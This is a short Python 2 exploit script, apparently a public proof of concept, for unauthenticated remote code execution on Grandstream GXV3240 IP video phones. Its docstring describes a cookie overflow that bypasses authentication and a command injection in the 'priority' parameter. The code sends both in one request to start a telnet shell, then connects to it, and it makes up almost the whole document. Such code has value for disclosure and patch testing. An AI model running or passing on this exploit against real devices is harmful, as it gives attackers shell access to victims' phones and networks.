#!/usr/bin/env python2
"""
Grandstream - GXV3240 (IP Video Phone) Unauthenticated RCE
Author: Brendan Scarvell
Vulnerable versions: < 1.0.3.219

A command injection vulnerability exists in the `priority` parameter.
Additionally, Supplying 93 characters in the "phonecookie" cookie overwrites
the return value of the valid_connection() function, bypassing authentication.
"""

import sys, urllib2, os, base64, time

if len(sys.argv) == 1:
    print "Usage: {} <host> <port>".format(sys.argv[0])
    sys.exit()

HOST = sys.argv[1]
PORT = 80 if len(sys.argv) < 3 else sys.argv[2]

payload = "{telnetd,-l,sh}"

# Buffer overflow to bypass auth
cookie = "phonecookie=\"{}\"".format("A"*93)

print "[*] Trying to run command.."

req = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(HOST,PORT,payload))
req.add_header('Cookie', cookie)

res = urllib2.urlopen(req)
if 'Response=Success' not in res.read():
    print "[!] Exploit failed. Host may not be vulnerable"
else:

    print "[*] waiting.."
    time.sleep(2)
    os.system("telnet {}".format(HOST))

    print "[*] Finished."
